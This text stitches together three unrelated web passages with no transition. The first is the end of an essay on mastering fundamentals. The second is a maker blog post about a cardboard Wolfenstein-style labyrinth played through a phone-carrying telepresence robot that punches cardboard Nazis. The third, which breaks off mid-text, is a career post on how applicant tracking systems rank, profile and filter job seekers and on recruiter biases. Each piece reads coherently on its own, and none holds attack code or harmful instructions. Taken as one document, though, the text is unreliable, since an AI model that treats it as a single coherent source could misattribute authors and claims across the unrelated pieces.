<p>Often, such skills and knowledge are <strong>fundamental</strong> and can be thought of as building blocks (or <a href="https://jamesclear.com/first-principles" target="_blank">first principles</a>). For example, in programming, we learn about conditionals, iteration, and data structures. In distributed data processing, we learn about map, reduce, and shuffle. Once we understand these fundamentals, it’s easier to pick up another programming language or distributed processing framework. It also helps us write more effective software and <a href="https://en.wikipedia.org/wiki/Extract,_transform,_load" target="_blank">ETL</a> jobs.</p>

<p>Mastering the fundamentals also helps with the <a href="https://commoncog.com/blog/to-get-good-go-after-the-metagame/" target="_blank">metagame</a>. The meta (i.e., higher-order factors) changes constantly. For example, <a href="https://eugeneyan.com/writing/nlp-supervised-learning-survey/" target="_blank">natural language processing</a> has evolved rapidly from recurrent models to embeddings to attention to …</p></div></details></div></div>

<h2>Play a first person game with a robot</h2>
<p><img alt="Looping video of a cardboard robot carrying a smartphone with a man's face on it moving from side to side" src="https://cdn.shopify.com/s/files/1/1041/4014/files/Wiggle1_1024x1024.gif?v=1598350839"></p>
<p>We've created a new expansion for <a href="https://thecraftyrobot.net/" title="Meet Smartibot">Smaribot</a> that allows you to build a telepresence robot that works with your phone. It's called <a href="https://www.kickstarter.com/projects/rossatkin/smartipresence-cardboard-telepresence-robot" target="_blank" title="Smartipresence on Kickstarter" rel="noopener noreferrer">Smartipresence</a> and&nbsp;to make it all work slickly&nbsp;we've built a telepresence system.</p>
<p><img alt="Looping video. First section shows a cardboard robot carrying a smartphone driving towards a small child. Second section shows the robot's point of view with buttons at the side moving it." src="https://cdn.shopify.com/s/files/1/1041/4014/files/ChasingChild5_1024x1024.gif?v=1598350981"></p>
<p>Driving the robot around from somewhere else feels a bit like playing a first person game and made me wonder what it would be like to build an actual game around it.</p>
<p>It felt appropriate to&nbsp;go back to the&nbsp;origin of the first person shooter genre and do Wolfenstein 3D. I think many of us miss the chunky pixels and moral clarity that Nazis are bad.&nbsp;</p>
<h2>Cardboard computer game</h2>
<p><img alt="Loping video of a small robot punching a cardboard Nazi in a cardboard labrynth" src="https://cdn.shopify.com/s/files/1/1041/4014/files/PunchGif2_1024x1024.gif?v=1598351095"></p>
<p>Because&nbsp;Wolfenstein 3D had 2D sprites (enemy characters) in a 3D world I thought it would probably transfer to cardboard quite nicely. I wanted to build it all on a table which limited space a bit, meaning I wasn't going to build a robot that could shoot (probably a good decision anyway) so I settled on a compact cardboard labyrinth and a robot that could punch.</p>
<h2>Punching robot</h2>
<p><img alt="Looping video of a close up of a cardboard fist punching a cardboard Nazi" src="https://cdn.shopify.com/s/files/1/1041/4014/files/PunchCloseUp1_1024x1024.gif?v=1598351227"></p>
<p>I used to live&nbsp;around the corner from&nbsp;the <a href="https://www.theguardian.com/artanddesign/2016/sep/25/the-full-history-of-the-cable-street-mural">Cable Street mural</a>,&nbsp;which&nbsp;is a great argument for punching Nazis, so this seemed good. I&nbsp;designed a compact 3D printed Smartibot chassis that could hold a smartphone and a 9g servo to operate the punch mechanism, to which I attached a nice pixelated fist. (files on Thingiverse).</p>
<h2>A game engine on your table</h2>
<p>I got a friend who's worked for many years creating computer games&nbsp;to test this out and she said "you've made a game engine", which wasn't really something I'd considered before but it makes sense.</p>
<p>Game engines (software frameworks that handle things like in-game physics and graphics) have allowed games producers to focus on the creative aspects of game making and opened up the field to many less technical people.</p>
<p>Using a small telepresence robot (like Smartipresence) in this way&nbsp;makes game creation even easier, all you need is a table (or bit of floor) to build your environment on, some things for the player to interact with and a clear idea of how the game mechanics should work. The physical world provides your physics and graphics engine and your hands handle the game mechanics.</p>
<p>I think this could be a <strong>really fun</strong> way for kids to interact with their loved ones remotely.</p>
<p><img alt="Looping video of a small purple circuit board with a smiling face on it connected to 14 motors all of which are moving back and fourth" src="https://cdn.shopify.com/s/files/1/1041/4014/files/AllTheMotors_1024x1024.gif?v=1598352223"></p>
<p>The robot I&nbsp;built to play Smartistein3D uses only three motors (the two that come in the Smartibot kit to drive the wheels and move it around plus the little servo for the punch) but because Smartibot is so flexible (and can control up to 14 motors) you could build more complicated robots for more complicated game mechanics (you could use almost any of the robots in the projects section as the character). Plus, if you've got&nbsp;strong enough internet, there's no reason not to have multiple players controlling multiple robots. ALSO, you could probably use <a href="https://thecraftyrobot.net/blogs/projects/simple-programming-with-the-a-i-getting-your-smartibot-to-run-away-from-people-but-still-chase-other-things" title="Smartibot A.I. programming">Smartibot's A.I.</a> mode to create enemies that move around and respond to the player characters automatically ... I&nbsp;doubt&nbsp;this&nbsp;will the last game I'll make with Smartipresence.</p>

<p>Whether you’re lucky enough to be employed or currently out of work, it’s no secret that <strong>landing a job in 2020 is harder than ever before.</strong></p>
<p><span>And while it’s easy to blame coronavirus and wallow in our job-seeker sorrow—and believe me, I’m not ignoring the very real challenges of our current economy—my research suggests there’s more to it than that.</span></p>
<p><span>A friend of mine had been applying to jobs prior to the pandemic, and he hadn’t landed a single interview.&nbsp;</span></p>
<p><span>I thought I’d have the solution to his problem in all of five minutes (I used to be </span>p<span>retty good at applying for jobs online</span><span>), but it turns out he was already doing everything </span><i><span>“right.”</span></i><span>&nbsp;</span></p>
<p><span>His resume listed quantified bullet point after quantified bullet point. The formatting looked good. He tailored his cover letters to the position descriptions. His online presence is superb; he owns the front page of Google results for his name. And LinkedIn rated his profile as an “All-Star.” Oh yeah, he’s also gainfully employed.</span></p>
<p><span>You might be thinking, “Well, if he applied through job boards, that’s his first problem.”&nbsp;</span></p>
<p><span>And I’m thinking, “He used to apply through job boards and land interviews more than 60 percent of the time just a few years ago, so what’s changed?”&nbsp;</span></p>
<p><span>Turns out, A LOT. And I would’ve never known if it wasn’t for my friend stumping me with his seemingly simple quandary. I’m flabbergasted by how out of touch I was with the modern job hunt, which is why I couldn’t </span><b>not</b><span> write this post.&nbsp;</span></p>
<p><strong>With the average job tenure lasting just one year on average, it’s extremely likely you’ll need to understand <i>why</i> in the near future.&nbsp;</strong></p>
<p><span>I wrote this post to demystify the modern recruiting process and help qualified candidates figure out how to apply for jobs online. So if you’re ready to make it past the initial resume screening process and score an interview—and ultimately land the opportunity you deserve—then keep reading.</span></p>

<p><span>TLDR: ATS help recruiters/hiring managers collect, sort, and organize a large number of applications.&nbsp;</span></p>

<h4><span>Most Common ATS Features</span></h4>
<p><span>Rather than manually reviewing each resume, recruiters and hiring managers search for resumes based on keywords, or have the system filter or automatically rank applicants.&nbsp;</span></p>
<p><span>In many cases, recruiters use the technology to do a first pass of resumes, meaning you can be removed from consideration </span><b>by an algorithm without ever being reviewed by a human</b><span>.&nbsp;</span></p>
<p><span><img title="how to apply for jobs online what happens to your resume ats 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02.png" alt="Infographic: What happens to your resume in an applicant tracking system" width="2501" height="10553" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02.png 2501w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-71x300.png 71w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-243x1024.png 243w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-768x3241.png 768w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-364x1536.png 364w" sizes="(max-width: 2501px) 100vw, 2501px">While there </span><a href="https://blog.ongig.com/applicant-tracking-system/top-ats-systems-used-by-the-fortune-500-2019"><span>hundreds of ATS on the market</span></a><span>, most of them list the same features. Understanding them is key to landing an interview. Here are the big ones that will determine whether a human ever sees your resume.</span></p>

<h5><span>Automatic Applicant Ranking/Scoring</span></h5>
<p><span>Many ATS provide an automatic “match rank” or score for each applicant.&nbsp;</span><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring.jpg" alt="candidate match score example on Job Score website" width="982" height="400" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring.jpg 982w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-300x122.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-768x313.jpg 768w" sizes="(max-width: 982px) 100vw, 982px"></a>The system will take and parse the information from your resume, and compare it with the job description, looking for specific keywords, then provide a score from 0 to 100, or one to 10, that tells recruiters how qualified a candidate is for said job, based on the criteria set by the hiring manager.&nbsp;</span></p>
<p><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02.jpg" alt="ATS extracts contact info, employment and education history from resumes" width="1000" height="420" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02-300x126.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02-768x323.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>They’ll also score you based on the answers you submit via the online form, aka “knockout questions.”&nbsp;</span></p>
<p><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring 03" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03.jpg" alt="Job Score website, qualifying questions" width="1000" height="763" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03-300x229.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03-768x586.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a></span></p>
<p><span>For example, job posts that ask for your location are likely using that information as a filter that will alter your overall qualification score.&nbsp;</span></p>

<h5><span>Comprehensive Candidate Profiles</span></h5>
<p><span>Many ATS will automatically create a comprehensive, wildly detailed profile of you based on your digital footprint and other “public” information. All they need is your email address to populate every piece of available content about you online.&nbsp;</span></p>
<p><span>According to </span><a href="https://resources.workable.com/tutorial/important-applicant-tracking-system-features"><span>Workable</span></a><span>, aggregating candidates’ public information is a way to “humanize” the process, and they list it as a must-have feature for today’s ATS. Here’s how they describe it:</span></p>
<p><i><span>“I want to see faces dammit. And tweets. And maybe other stuff that humanizes this record.”</span></i></p>
<p><span>(In my opinion, that’s just a recipe for complete and total bias, as we know </span><a href="https://www.crowdstaffing.com/blog/hidden-bias-that-affect-the-hiring-process"><span>there’s A LOT of it in recruiting</span></a><span>, even if it’s subconscious.)&nbsp;</span></p>
<p><span>Many <a href="https://www.entelo.com/products/platform/search/">recruitment tools</a> even go so far as to make predictions about candidates based on the information they surface about them online.&nbsp;</span></p>
<p><a href="https://www.entelo.com/products/platform/search/"><span><img title="how to apply for jobs online ats candidate profiles" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles.png" alt="Profile of senior product designer at Acme and predictions about his performance, fit, and longevity." width="1010" height="958" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles.png 1010w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles-300x285.png 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles-768x728.png 768w" sizes="(max-width: 1010px) 100vw, 1010px"></span></a></p>
<p><span>In </span><a href="https://recruitingtools.com/boolean-strings-network/"><span>one of the first posts I read by a recruiter</span></a><span> on this topic, she tells hiring managers to search data enrichment tools/databases, like Pipl, Jigsaw and Zoominfo.&nbsp;</span></p>
<p><span>Pipl’s main use case is for “investigations.”&nbsp;</span></p>
<p><i><span>“</span></i><a href="https://pipl.com/investigation-and-research"><i><span>Pipl’s identity resolution engine</span></i></a><i><span> cross-references global data from the Internet, public records, listings, directories, archives and exclusive sources to show the connections between people and the world.”</span></i></p>
<p><span>ZoomInfo is more for B2B data enrichment. Check out the screenshot below to see how they collect your information.&nbsp;</span></p>
<p><span><a href="https://www.zoominfo.com/business/our-data?utm_campaign=branded"><img title="how to apply for jobs online candidate profiles zoominfo 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02.jpg" alt="ZoomInfo" width="1000" height="899" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02-300x270.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02-768x690.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>Pretty scary, huh?&nbsp;</span></p>

<h5><span>Resume Parsing</span></h5>
<p><span>This is sort-of a feature of the “Automatic Applicant Ranking/Score” section, but it’s also important to mention on its own.&nbsp;</span></p>
<p><span>Resume parsing refers to how ATS extracts and organizes your resume into “structured data,” so they can do stuff like rank/score you automatically.&nbsp;</span></p>
<p><span>This means that many times submitting a PDF, or using creative typography, will hurt you, because the ATS can’t read the data well, if at all.&nbsp;</span></p>

<h5><span>Resume Storage</span></h5>
<p><span>Even if you’re rejected for a position, the ATS will store your resume in its system, because every time there’s a new role to fill, they’ll start with searching their databases to see who might be a match, which leads me to the next feature.&nbsp;</span></p>

<h5><span>Search and Filters</span></h5>
<p><span>ATS allows hiring managers to search by any keyword, and often with </span><a href="https://recruitingtools.com/boolean-strings-network/"><span>Boolean search</span></a><span>, which connects keywords using AND, OR, NOT and NEAR.</span></p>
<p><span>Some tools will even let you filter by those it labels “not job hoppers,” etc.&nbsp;</span></p>
<p><span>Filters may include the job seeker’s location, application source, age of your profile, and whether or not you’re an employee referral.&nbsp;</span></p>

<h4><span>Recruiters’ dirty little secrets&nbsp;</span></h4>
<h5><span>Backchanneling / Backdoor references</span></h5>
<p><span>If the recruiter actually sees your resume and is interested in interviewing you, she’ll likely visit your LinkedIn profile to make sure everything checks out.&nbsp;</span></p>
<p><span>She may even message any mutual connections you have to see what they’ll say about you. This is illegal but it happens all the time from </span><a href="https://www.glassdoor.com/blog/8-secrets-recruiters-wont-tell-you/"><span>what I read</span></a><span>.</span></p>
<p><i><span>“This phenomenon is even more prevalent in the last five years or so because of LinkedIn’s growing popularity. Even if you choose not to give anybody there as a reference, backdoor references can reveal the skeletons in your closet. Backdoor references can be especially common when you’re looking for a job in sectors like tech.”</span></i></p>

<h5><span>Cyberstalking</span></h5>
<p><span>Another potentially discriminatory and sometimes illegal practice includes cyberstalking you.&nbsp;</span></p>
<p><i><span>“A lot of recruiters—most that I know—will Google candidates who make it pretty far [in the hiring process], and then use Google image results, and also blog posts, tweets, and open Facebook accounts to judge someone’s character and credibility.” (</span></i><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><i><span>Source</span></i></a><i><span>)</span></i></p>

<h5><span>[Subconscious] Bias</span></h5>
<p><span>Whether it’s subconscious or downright discriminatory, hiring managers usually have a </span><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><span>preconceived picture</span></a><span> of what the perfect candidate looks like, which often is based on stereotypes.</span></p>

<p><b>Bias 1: Being overweight</b></p>
<p><span>Weight bias is still especially prevalent, according to one recruiter, who says being overweight can make people think the person is lazy or lacks motivation.</span></p>

<p><b>Bias 2: “Diversity”</b></p>
<p><span>“Diversity in Silicon Valley’s mind is the picture of Phylicia Rashad,” (the actress who portrayed Clair Huxtable on The Cosby Show), said another recruiter </span><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><span>via the same article</span></a><span>.&nbsp;</span></p>
<p><span>According to the post, she sees African-American women considered more readily for roles as diversity/inclusion chiefs, while white men more often lead the pack to head up sales teams.</span></p>
<p><span>Another recruiter bolsters her experience:&nbsp;</span></p>
<p><i><span>“There’s a penchant to see more diversity, but the definition is narrow,” typically reduced to race and gender; it was common to tout a candidate for being a “visible minority.” “It’s the only way to highlight that for the client on a call,” he explains, since “we can’t put it in our documentation.”</span></i></p>

<p><b>Bias 3: Looking “too young”&nbsp;&nbsp;</b></p>
<p><span>The same recruiter from above said he also sees a lot of ageism in the hiring process.&nbsp;</span></p>
<p><span>For example, there’s kind-of a sweet spot in terms of age for C-level positions, he said.&nbsp;</span></p>
<p><span>“My boss would say things like, ‘Did they have enough gray hair?’—not literally, but are they seasoned enough, do they have enough experience where they could be credible?”&nbsp;</span></p>
<p><span>There were occasions when recruiters would nominate younger, well-qualified candidates for senior leadership roles, Mark recalls, but “I’d say 20% of the time they’re open to meeting with that person.”</span></p>

<p><b>Bias 4: Expensive degrees</b></p>
<p><span>At the beginning of the recruitment process, recruiters are dealing with so many resumes that they use a prestigious degree as a quick way to filter down the candidate pool.&nbsp;</span></p>
<p><span>According to a recruiter from that FastCompany article I mentioned …</span></p></span></section></article></div></div>
